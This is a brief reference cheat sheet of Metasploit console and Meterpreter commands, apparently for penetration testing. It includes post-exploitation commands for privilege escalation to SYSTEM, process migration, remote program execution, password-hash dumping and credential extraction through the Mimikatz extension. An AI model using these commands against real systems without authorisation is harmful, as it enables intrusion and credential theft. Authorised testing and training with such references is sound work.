# Metasploit & Meterpreter Cheat Sheet

# Metasploit Console Commands (msfconsole)

```json
search <keyword>          # Find modules (e.g. search smb)
use <path>                # Load a module (e.g. use exploit/windows/smb/psexec)
info                      # Show detailed info about the module
show options (or options) # List configurable parameters
set <opt> <val>           # Configure an option (e.g. set RHOSTS 192.168.1.10)
setg <opt> <val>          # Set a global option (applies everywhere)
show payloads             # Show compatible payloads for current exploit
exploit (or run)          # Launch the exploit/module
back                      # Return to the main msfconsole prompt
sessions -l (or -i -h)    # List active sessions
sessions -i <id>          # Interact with a session
jobs -l                   # List background jobs (listeners/scans)
jobs -k <id>              # Kill a background job
resource <file.rc>        # Run a resource script (batch of commands)
```

# Meterpreter Core Commands

```json
? (or help)               # Show available Meterpreter commands
background (or bg)        # Background current session
exit (or quit)            # Exit Meterpreter session
sessions -i <id>          # Return to a backgrounded session
```

# Meterpreter System Commands

```json
sysinfo                   # Show system information
getuid                    # Show which user Meterpreter runs as
getprivs                  # Show available token privileges (SeDebug, SeImpersonate, etc.)
getsystem                 # Attempt privilege escalation to SYSTEM
ps                        # List running processes
migrate <pid>             # Migrate into another process
shell                     # Drop into a Windows command shell
reboot                    # Reboot the system
```

# Meterpreter File & Persistence

```json
download <path>           # Download file from target
upload <file>             # Upload file to target
execute -f <program>      # Run a program on the target
```

# Meterpreter Credential Access

```json
hashdump                  # Dump local password hashes
load kiwi                 # Load Mimikatz extension
creds_all                 # Dump all creds (after kiwi loaded)
```

 © 2026 DEATHGroup Labs LLC. All rights reserved.